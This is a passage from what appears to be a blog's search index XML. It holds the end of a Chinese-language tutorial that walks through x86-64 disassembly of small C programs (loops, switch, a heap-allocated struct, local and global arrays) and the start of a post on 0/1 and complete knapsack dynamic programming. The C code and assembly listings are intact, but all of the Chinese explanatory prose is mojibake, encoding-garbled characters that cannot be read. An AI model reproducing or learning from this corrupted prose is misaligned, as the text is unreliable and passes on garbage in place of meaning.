eax,DWORD PTR [rbp-0x14]401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax401248:    7e e0                    jle    40122a <main+0xa4></code></pre><p>é¦–å…ˆå®šä¹‰å˜é‡i=0ï¼Œ<strong>mov    DWORD PTR [rbp-0xc],0x0</strong>ï¼Œç„¶åå’Œå˜é‡bè¿›è¡Œæ¯”è¾ƒï¼Œ</p><pre class=" language-assembly"><code class="language-assembly">401228:    eb 18                    jmp    401242 <main+0xbc>......401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax401248:    7e e0                    jle    40122a <main+0xa4></code></pre><p>å°†bçš„å€¼å­˜å…¥eaxï¼Œç„¶åä¸iç›¸æ¯”è¾ƒï¼Œi&lt;=bå³è·³è½¬</p><pre class=" language-assembly"><code class="language-assembly">40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]40122d:    89 c6                    mov    esi,eax40122f:    bf 04 20 40 00           mov    edi,0x402004401234:    b8 00 00 00 00           mov    eax,0x0401239:    e8 12 fe ff ff           call   401050 <printf@plt>40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1</code></pre><p>è¿™é‡Œå°±æ˜¯è°ƒç”¨printfå‡½æ•°ï¼Œç„¶åå¾€ä¸‹å°±æœ‰åˆ°äº†æ¯”è¾ƒç¯èŠ‚ï¼Œå¾ªç¯</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å†å›è¿‡å¤´çœ‹ifè¯­å¥çš„ä»£ç å—</p><pre class=" language-assembly"><code class="language-assembly">4011d3:    48 8d 45 f0              lea    rax,[rbp-0x10]4011d7:    48 89 c6                 mov    rsi,rax4011da:    bf 04 20 40 00           mov    edi,0x4020044011df:    b8 00 00 00 00           mov    eax,0x04011e4:    e8 87 fe ff ff           call   401070 <__isoc99_scanf@plt>4011e9:    8b 45 f0                 mov    eax,DWORD PTR [rbp-0x10]4011ec:    83 f8 02                 cmp    eax,0x24011ef:    74 18                    je     401209 <main+0x83>4011f1:    83 f8 03                 cmp    eax,0x34011f4:    74 1f                    je     401215 <main+0x8f>4011f6:    83 f8 01                 cmp    eax,0x14011f9:    74 02                    je     4011fd <main+0x77>4011fb:    eb 4d                    jmp    40124a <main+0xc4>4011fd:    bf 31 00 00 00           mov    edi,0x31401202:    e8 29 fe ff ff           call   401030 <putchar@plt>401207:    eb 41                    jmp    40124a <main+0xc4>401209:    bf 32 00 00 00           mov    edi,0x3240120e:    e8 1d fe ff ff           call   401030 <putchar@plt>401213:    eb 35                    jmp    40124a <main+0xc4>401215:    bf 33 00 00 00           mov    edi,0x3340121a:    e8 11 fe ff ff           call   401030 <putchar@plt></code></pre><p>æµç¨‹ä¹Ÿæ˜¯å…ˆå®šä¹‰å˜é‡cï¼Œç„¶åè°ƒç”¨scanfï¼Œç„¶åå°†cçš„å€¼å­˜å…¥eaxï¼Œä¸1ã€2ã€3ä½œæ¯”è¾ƒï¼Œç›¸ç­‰åˆ™è·³è½¬åˆ°å¯¹åº”çš„è¯­å¥ï¼Œå…¶ä¸­<strong>break</strong>çš„æ±‡ç¼–ä»£ç å°±æ˜¯</p><p><strong>jmp    40124a &lt;main+0xc4&gt;</strong>ï¼Œè·³è½¬åˆ°ç¨‹åºç»“å°¾</p><pre class=" language-assembly"><code class="language-assembly">40124a:    b8 00 00 00 00           mov    eax,0x040124f:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]401253:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x2840125a:    00 00 40125c:    74 05                    je     401263 <main+0xdd>40125e:    e8 dd fd ff ff           call   401040 <__stack_chk_fail@plt>401263:    c9                       leave  401264:    c3                       ret</code></pre><p>è¿™ä¸ªç®€å•çš„ç¨‹åºå°±å·®ä¸å¤šåˆ†æå®Œäº†ï¼Œè¿™ä¹ˆåˆ†æä¸‹æ¥æ±‡ç¼–ä»£ç ä¹Ÿå¹¶æ²¡æœ‰æƒ³è±¡çš„é‚£ä¹ˆéš¾ï¼Œéƒ½æ˜¯æœ‰æ®å¯ä¾çš„ï¼Œæ¯”å¦‚è°ƒç”¨å‡½æ•°å…ˆä¼ å‚ï¼Œifè¯­å¥åˆ™æ˜¯cmpä¹‹åè·³è½¬ï¼Œswitchè¯­å¥ä¹Ÿæ˜¯å¤šä¸ªæ¯”è¾ƒå’Œè·³è½¬è¯­å¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å¦ä¸€ä¸ªå°ç¨‹åºï¼Œç»“æ„ä½“åˆ†æ</p><h2 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">struct</span> person<span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> person <span class="token operator">*</span>man<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>height<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-assembly"><code class="language-assembly">401156:    55                       push   rbp401157:    48 89 e5                 mov    rbp,rsp40115a:    53                       push   rbx40115b:    48 83 ec 18              sub    rsp,0x1840115f:    bf 38 00 00 00           mov    edi,0x38401164:    e8 d7 fe ff ff           call   401040 <malloc@plt>401169:    48 89 05 f0 2e 00 00     mov    QWORD PTR [rip+0x2ef0],rax        # 404060 <man>401170:    48 8b 1d e9 2e 00 00     mov    rbx,QWORD PTR [rip+0x2ee9]        # 404060 <man>401177:    bf 10 00 00 00           mov    edi,0x1040117c:    e8 bf fe ff ff           call   401040 <malloc@plt>401181:    48 89 03                 mov    QWORD PTR [rbx],rax401184:    48 8b 05 d5 2e 00 00     mov    rax,QWORD PTR [rip+0x2ed5]        # 404060 <man>40118b:    c7 40 08 12 00 00 00     mov    DWORD PTR [rax+0x8],0x12401192:    48 8b 05 c7 2e 00 00     mov    rax,QWORD PTR [rip+0x2ec7]        # 404060 <man>401199:    c7 40 0c b4 00 00 00     mov    DWORD PTR [rax+0xc],0xb44011a0:    c7 45 ec 00 00 00 00     mov    DWORD PTR [rbp-0x14],0x04011a7:    eb 1b                    jmp    4011c4 <main+0x6e>4011a9:    48 8b 05 b0 2e 00 00     mov    rax,QWORD PTR [rip+0x2eb0]        # 404060 <man>4011b0:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011b3:    48 63 d2                 movsxd rdx,edx4011b6:    48 8d 4a 04              lea    rcx,[rdx+0x4]4011ba:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011bd:    89 14 88                 mov    DWORD PTR [rax+rcx*4],edx4011c0:    83 45 ec 01              add    DWORD PTR [rbp-0x14],0x14011c4:    83 7d ec 09              cmp    DWORD PTR [rbp-0x14],0x94011c8:    7e df                    jle    4011a9 <main+0x53>4011ca:    b8 00 00 00 00           mov    eax,0x04011cf:    48 83 c4 18              add    rsp,0x184011d3:    5b                       pop    rbx4011d4:    5d                       pop    rbp4011d5:    c3                       ret    </code></pre><p>Cä»£ç ä¸­å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œç„¶åå®šä¹‰äº†äº”ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œæˆ‘ä»…ä»…å¯¹ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆè¿›è¡Œäº†åˆå§‹åŒ–ï¼Œæ›´å¥½çš„è§‚å¯Ÿç»“æ„ä½“åœ¨æ±‡ç¼–ä»£ç ä¸­çš„å®ç°</p><p>é¦–å…ˆæ˜¯ç»™ç»“æ„ä½“åˆ†é…å†…å­˜</p><pre class=" language-c"><code class="language-c">man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™ä¸€å¥å¯¹åº”ç€çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹</p><pre class=" language-assembly"><code class="language-assembly">40115f:    bf 38 00 00 00           mov    edi,0x38401164:    e8 d7 fe ff ff           call   401040 <malloc@plt>401169:    48 89 05 f0 2e 00 00     mov    QWORD PTR [rip+0x2ef0],rax </code></pre><p>mallocçš„å‚æ•°ä¸º0x38ï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæ±‡ç¼–ä¸­ç»“æœä¸€èˆ¬æ”¾åœ¨eaxå¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œmallocçš„è¿”å›å€¼ç›´æ¥å­˜å…¥äº†eaxï¼Œç„¶åå°†raxçš„å€¼å­˜å…¥<strong>$rip+0x2ef0</strong>æŒ‡å‘çš„åœ°å€ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªç›¸å¯¹å¯»å€ï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡æ˜¯å­˜å‚¨åœ¨bssæ®µçš„ã€‚</p><p>å†çœ‹åˆ°è¿™ä¸‰å¥ä»£ç </p><pre class=" language-c"><code class="language-c">man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>height<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">;</span></code></pre><p>å¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸º</p><pre class=" language-assembly"><code class="language-assembly">401170:    48 8b 1d e9 2e 00 00     mov    rbx,QWORD PTR [rip+0x2ee9]        # 404060 <man>401177:    bf 10 00 00 00           mov    edi,0x1040117c:    e8 bf fe ff ff           call   401040 <malloc@plt>401181:    48 89 03                 mov    QWORD PTR [rbx],rax401184:    48 8b 05 d5 2e 00 00     mov    rax,QWORD PTR [rip+0x2ed5]        # 404060 <man>40118b:    c7 40 08 12 00 00 00     mov    DWORD PTR [rax+0x8],0x12401192:    48 8b 05 c7 2e 00 00     mov    rax,QWORD PTR [rip+0x2ec7]        # 404060 <man>401199:    c7 40 0c b4 00 00 00     mov    DWORD PTR [rax+0xc],0xb4</code></pre><p>é¦–å…ˆå°†man[0]çš„å€¼(å³malloc(0x38)çš„è¿”å›å€¼)å­˜å…¥rbxï¼Œç„¶åè°ƒç”¨mallocï¼Œåˆ†é…nameæŒ‡é’ˆï¼Œç„¶åå°†æŒ‡é’ˆå­˜å…¥man[0]çš„å€¼æŒ‡å‘çš„åœ°å€ï¼Œå®é™…ä¸Šåœ¨å †åŒºï¼Œç„¶åå†å°†man[0]çš„å€¼å­˜å…¥raxï¼Œå¾€*(man[0]+8)å†™å…¥0x12ï¼Œæ¥ç€ç»§ç»­å¾€</p><p>*(man[0]+0xc)å†™å…¥0xb4</p><p>è¿˜å‰©ä¸‹æœ€åä¸€æ®µï¼Œç»™æ•°ç»„å¾ªç¯èµ‹å€¼</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span></code></pre><pre class=" language-assembly"><code class="language-assembly">4011a0:    c7 45 ec 00 00 00 00     mov    DWORD PTR [rbp-0x14],0x04011a7:    eb 1b                    jmp    4011c4 <main+0x6e>4011a9:    48 8b 05 b0 2e 00 00     mov    rax,QWORD PTR [rip+0x2eb0]        # 404060 <man>4011b0:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011b3:    48 63 d2                 movsxd rdx,edx4011b6:    48 8d 4a 04              lea    rcx,[rdx+0x4]4011ba:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011bd:    89 14 88                 mov    DWORD PTR [rax+rcx*4],edx4011c0:    83 45 ec 01              add    DWORD PTR [rbp-0x14],0x14011c4:    83 7d ec 09              cmp    DWORD PTR [rbp-0x14],0x94011c8:    7e df                    jle    4011a9 <main+0x53></code></pre><p>é¦–å…ˆå®šä¹‰å˜é‡iï¼Œç„¶åè·³è½¬ï¼Œå’Œ9è¿›è¡Œå¤§å°æ¯”è¾ƒï¼Œå¦‚æœå°äºç­‰äº9åˆ™è·³è½¬ï¼Œç„¶åå°†<em>man[0]å­˜å…¥raxï¼Œå°†iå­˜å…¥edxï¼Œä¸‹é¢çš„<strong>movsxd rdx,edx</strong>æ˜¯å°†edxç”±32ä½æ‰©å±•ä¸º64ä½ï¼Œå°†é«˜32ä½ç½®ä¸ºç¬¬31ä½(å³edxçš„æœ€é«˜ä½)çš„å€¼ï¼Œæ‰©å±•äº†ä½æ•°ï¼Œæ•°å€¼ä¿æŒä¸å˜ï¼Œæ¥ç€å°†i+4å­˜å…¥rcxï¼Œå°†iå­˜å…¥edxï¼Œå°†edxçš„å€¼ä¼ ç»™\</em>(man[0])+$rcx<em>\</em>4,è¿™æ ·ï¼Œä¸€å¼€å§‹i=0ï¼Œi+4=4,edx=0ï¼Œå³å°†0ä¼ å…¥*(man[0])+4<em>4=\</em>(man[0])+0x10å¤„ï¼Œ*(man[0])å­˜å…¥äº†nameï¼Œ*(man[0])+0x8å­˜å…¥äº†ageï¼Œ*(man[0])+0xcå­˜å…¥äº†hieghtï¼Œæ‰€ä»¥x[0]æ­£å¥½æ˜¯å­˜æ”¾åœ¨*(man[0])+0x10åœ°å€å¤„çš„ï¼Œå‰©ä¸‹çš„æ•°å­˜å…¥çš„åœ°å€ä¹Ÿæ˜¯æ¯æ¬¡å¢åŠ 4å­—èŠ‚ï¼Œé‚£ä¹ˆï¼Œæ•´ä¸ªç»“æ„ä½“çš„å¤§æ¦‚ç»“æ„å›¾å¦‚ä¸‹</p><pre><code>0x404060:man[0]-----                    |                    |                            ----&gt;  -----------                          |              |                          |      *name      |----------                          |              |            |                           -----------            |                          |              |            |                              |       age      |            |                          |              |            |                            -----------            |                          |              |            |                          |      height  |            |                          |              |            |                            -----------            |                          |              |            |                          |      x[10]      |            |                          |              |            |                           -----------            |                                                   |                                                   ------&gt;  --------                                                           |         |                                                           |  name  |                                                           |        |                                                            --------</code></pre><h2 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h2><p>è¿™ä¸ªdemoä¸»è¦æ˜¯åˆ†ææ•°ç»„å®ç°</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-assembly"><code class="language-assembly">  401156:    55                       push   rbp  401157:    48 89 e5                 mov    rbp,rsp  40115a:    48 83 ec 40              sub    rsp,0x40  40115e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  401165:    00 00   401167:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  40116b:    31 c0                    xor    eax,eax  40116d:    c7 45 cc 00 00 00 00     mov    DWORD PTR [rbp-0x34],0x0  401174:    eb 10                    jmp    401186 <main+0x30>  401176:    8b 45 cc                 mov    eax,DWORD PTR [rbp-0x34]  401179:    48 98                    cdqe     40117b:    8b 55 cc                 mov    edx,DWORD PTR [rbp-0x34]  40117e:    89 54 85 d0              mov    DWORD PTR [rbp+rax*4-0x30],edx  401182:    83 45 cc 01              add    DWORD PTR [rbp-0x34],0x1  401186:    83 7d cc 09              cmp    DWORD PTR [rbp-0x34],0x9  40118a:    7e ea                    jle    401176 <main+0x20>  40118c:    b8 00 00 00 00           mov    eax,0x0  401191:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]  401195:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x28  40119c:    00 00   40119e:    74 05                    je     4011a5 <main+0x4f>  4011a0:    e8 8b fe ff ff           call   401030 <__stack_chk_fail@plt>  4011a5:    c9                       leave    4011a6:    c3                       ret    </code></pre><p>å…¶å®åˆ†æè¿‡ä¸Šé¢çš„ç»“æ„ä½“çš„æ•°ç»„ï¼Œè¿™ä¸ªå°±å¾ˆæ¸…æ¥šäº†ï¼Œ</p><pre class=" language-assembly"><code class="language-assembly">40116d:    c7 45 cc 00 00 00 00     mov    DWORD PTR [rbp-0x34],0x0401174:    eb 10                    jmp    401186 <main+0x30></code></pre><p>è¿™ä¸€å¥å®šä¹‰å˜é‡iï¼Œç„¶åè·³è½¬</p><pre class=" language-assembly"><code class="language-assembly">401186:    83 7d cc 09              cmp    DWORD PTR [rbp-0x34],0x940118a:    7e ea                    jle    401176 <main+0x20></code></pre><p>ä¸¤æ®µåŠ èµ·æ¥å°±æ˜¯forå¾ªç¯äº†</p><pre class=" language-assembly"><code class="language-assembly">401176:    8b 45 cc                 mov    eax,DWORD PTR [rbp-0x34]401179:    48 98                    cdqe   40117b:    8b 55 cc                 mov    edx,DWORD PTR [rbp-0x34]40117e:    89 54 85 d0              mov    DWORD PTR [rbp+rax*4-0x30],edx401182:    83 45 cc 01              add    DWORD PTR [rbp-0x34],0x1</code></pre><p>è¿™é‡Œå°±èƒ½çœ‹å‡ºï¼Œa[10]æ˜¯ä»$rbp-0x30å¼€å§‹å­˜å‚¨çš„ï¼Œä¸€ä¸ªå€¼å ç”¨å››ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ ¹æ®è¿™ä¸¤ä¸ªdemoï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œæ•°ç»„è¿ç»­å ç”¨ä¸€å—å†…å­˜ï¼Œå’Œå…¶ä»–å±€éƒ¨å˜é‡ä¸€æ ·éƒ½æ˜¯é€šè¿‡$rbpå¯»å€ï¼Œå†çœ‹æœ€åä¸€ä¸ªdemoï¼Œbssæ®µçš„æ•°ç»„</p><h2 id="demo3-1"><a href="#demo3-1" class="headerlink" title="demo3"></a>demo3</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-assembly"><code class="language-assembly">  401146:    55                       push   rbp  401147:    48 89 e5                 mov    rbp,rsp  40114a:    c7 45 fc 00 00 00 00     mov    DWORD PTR [rbp-0x4],0x0  401151:    eb 13                    jmp    401166 <main+0x20>  401153:    8b 45 fc                 mov    eax,DWORD PTR [rbp-0x4]  401156:    48 98                    cdqe     401158:    8b 55 fc                 mov    edx,DWORD PTR [rbp-0x4]  40115b:    89 14 85 60 40 40 00     mov    DWORD PTR [rax*4+0x404060],edx  401162:    83 45 fc 01              add    DWORD PTR [rbp-0x4],0x1  401166:    83 7d fc 09              cmp    DWORD PTR [rbp-0x4],0x9  40116a:    7e e7                    jle    401153 <main+0xd>  40116c:    b8 00 00 00 00           mov    eax,0x0  401171:    5d                       pop    rbp  401172:    c3                       ret    </code></pre><p>è¿™ä¸ªdemoä¸­æ•°ç»„æ˜¯æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œæ±‡ç¼–ä»£ç ä¸­å’Œä¸Šä¸€ä¸ªçš„å·®åˆ«åœ¨äºå¯»å€</p><pre class=" language-assembly"><code class="language-assembly">40115b:    89 14 85 60 40 40 00     mov    DWORD PTR [rax*4+0x404060],edx</code></pre><p>å±€éƒ¨å˜é‡æ•°ç»„é€šè¿‡$rbpå¯»å€ï¼Œè€Œå…¨å±€å˜é‡æ•°ç»„ç›´æ¥é€šè¿‡æ•°ç»„åœ¨bssæ®µä¸­çš„åœ°å€æ¥å¯»å€</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’ </tag>
            
            <tag> C </tag>
            
            <tag> èƒŒåŒ…é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’çš„èƒŒåŒ…é—®é¢˜</title>
      <link href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/"/>
      <url>/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…"><a href="#01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…" class="headerlink" title="01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…"></a>01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…</h2><p>è®°å½•ä¸€ä¸‹è¿™ä¸¤å¤©å­¦ä¹ çš„åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Œæ‹–äº†å¥½ä¹…äº†</p><a id="more"></a><p>åŠ¨æ€è§„åˆ’å¯ä»¥è¯´æ˜¯é€’å½’çš„å‡çº§ç‰ˆï¼Œç”šè‡³å¯ä»¥æ›¿ä»£BFSå’ŒDFSï¼Œèƒ½ç†Ÿç»ƒæŒæ¡çš„è¯å°±ä¸ç”¨å†å°±çº ç»“ç”¨ä»€ä¹ˆæœç´¢ç®—æ³•å¥½äº†<br>è¿™ä¸¤å¤©åœ¨æ´›è°·ä¸Šåˆ·äº†ä¸€ä¸‹åŠ¨æ€è§„åˆ’åœ°èƒŒåŒ…ç®—æ³•éƒ¨åˆ†ï¼Œæ·±æ„ŸDPçš„ä¾¿åˆ©ï¼Œç”¨è´ªå¿ƒç®—æ³•çš„è¯è¦å†™ä¸€å¤§ç¯‡ä»£ç <br>è¿›å…¥æ­£é¢˜<br>èƒŒåŒ…ç®—æ³•å¯åˆ†ä¸º01èƒŒåŒ…ï¼Œå®Œå…¨èƒŒåŒ…å’Œå¤šé‡èƒŒåŒ…ï¼Œåœ¨è¿™é‡Œä¸»è¦è®°å½•å‰ä¸¤ç§ï¼Œå…ˆè´´å‡ºä¸¤ç§èƒŒåŒ…ç®—æ³•çš„æ ¸å¿ƒä»£ç <br>å®Œå…¨èƒŒåŒ…ä»£ç æ®µï¼š</p><pre class=" language-c"><code class="language-c">    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>V<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™æ˜¯01èƒŒåŒ…çš„æ ¸å¿ƒä»£ç æ®µï¼š</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>m<span class="token punctuation">;</span>j<span class="token operator">>=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>å¯ä»¥çœ‹å‡ºï¼Œå®Œå…¨èƒŒåŒ…å’Œ01èƒŒåŒ…çš„å·®åˆ«ä»…ä»…åœ¨äºç¬¬äºŒæ¬¡éå†çš„æ–¹å‘ï¼Œå‰è€…æ˜¯æ­£å‘éå†ï¼Œè€Œåè€…æ˜¯é€†å‘éå†</p><h2 id="01èƒŒåŒ…"><a href="#01èƒŒåŒ…" class="headerlink" 